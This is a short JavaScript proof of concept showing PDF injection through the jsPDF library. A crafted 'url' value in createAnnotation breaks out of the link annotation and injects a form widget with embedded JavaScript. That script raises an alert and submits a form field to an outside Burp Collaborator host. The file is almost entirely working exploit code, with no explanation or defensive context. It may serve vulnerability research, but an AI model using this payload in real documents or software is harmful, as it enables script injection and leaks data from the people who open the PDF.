const {jsPDF} = require("jspdf");
var doc = new jsPDF();
doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`#)>>>><</Type/Annot/Rect[ 0 0 900 900]/Subtype/Widget/Parent<</FT/Tx/T(Abc)/V(blah)>>/A<</S/JavaScript/JS(
app.alert(1);
this.submitForm('https://aiws4u6uubgfdag94xvc5wbrfilc91.burpcollaborator.net', false, false, ['Abc']);
)/(`});
doc.text(20, 20, 'Test text');
doc.save("output.pdf");
